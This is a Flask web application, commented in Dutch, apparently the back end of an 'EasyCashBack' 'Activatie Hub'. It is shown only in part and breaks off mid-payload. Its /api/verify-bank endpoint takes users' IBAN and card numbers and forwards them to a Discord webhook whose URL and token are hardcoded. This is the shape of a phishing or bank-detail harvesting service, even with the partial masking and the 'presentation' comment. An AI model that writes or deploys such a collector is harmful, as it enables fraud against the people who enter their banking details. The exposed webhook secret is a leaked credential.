import os
from flask import Flask, render_template, request, jsonify
import requests

# De variabele 'app' moet exact zo heten voor Gunicorn op Render
app = Flask(__name__)

# Haal de Discord Webhook URL op uit de omgeving of gebruik je backup link
DISCORD_WEBHOOK_URL = os.environ.get(
    "DISCORD_WEBHOOK", 
    "https://discord.com/api/webhooks/1491401500428079174/6sKKzOPurbFR-X557CPYUDXgRATDio87eg0GWwUMVFZkopS5D4VW7oJegJeUhM_B1Ir5"
)

@app.route('/')
def index():
    """Toont de hoofdpagina van de Activatie Hub."""
    return render_template('index.html')

@app.route('/api/verify-bank', methods=['POST'])
def verify_bank():
    """Ontvangt bankgegevens en stuurt een geanonimiseerd bericht naar Discord."""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "Geen data ontvangen"}), 400
            
        raw_iban = data.get('iban', 'Onbekend')
        raw_card = data.get('card', 'Onbekend')
        
        # Privacy Masking (Beveiliging voor je presentatie)
        # We laten alleen de eerste 4 en laatste 2 tekens van de IBAN zien
        m_iban = f"{raw_iban[:4]} **** {raw_iban[-2:]}" if len(raw_iban) > 8 else "****"
        # We laten alleen de laatste 3 cijfers van de kaart zien
        m_card = f"**** **** {raw_card[-3:]}" if len(raw_card) > 3 else "****"

        # Stel het bericht voor Discord samen op een veilige manier
        payload = {
            "embeds": [{
                "title": "🔒 Beveiligde Activatie Verwerkt",
                "description": "Nieuwe koppeling via de EasyCashBack Hub.",
                "color": 3447003,
                "fields": [
                    {"name": "🏦 IBAN (Gezensureerd)", "value": f"
